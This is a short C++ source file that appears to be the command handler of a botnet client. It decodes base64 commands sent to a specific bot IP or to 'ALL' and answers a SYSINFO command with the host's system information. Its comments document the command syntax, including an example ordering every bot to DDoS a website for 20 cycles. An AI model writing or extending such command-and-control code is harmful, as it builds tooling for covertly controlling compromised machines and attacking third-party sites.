#include "common.h"

#define VISAGE_BASE_COMMAND "{COMMAND:}"
#define VISAGE_COMMAND_INFO "SYSINFO"

//command format: [TO] TYPE[ARGS IF REQUIRED]
//ex: 2.2.2.2 SYSINFO //no args for sysinfo
//ex: ALL DDOS[www.example.com,20] //all ddos www.example.com for 20 cylces

bool IsCommand(const char* data,const char*type)
{
	if (strstr(data,type) != 0)
		return true;
	return false;
}

std::string TeleHandleCommand(std::string data,std::string ip) //command should be in base64 format for simplicity
{
	std::string decoded = base64_decode(data);
	const char*isMe = strstr(decoded.c_str(),ip.c_str());
	if (isMe != 0 || (strstr(decoded.c_str(),"ALL") != 0)) //command for me :)
	{
		if (IsCommand(decoded.c_str(),VISAGE_COMMAND_INFO))
		{
			//get sys info
			return GetSysInfo();
		}
	
	}
	return std::string("Unknown Command");
}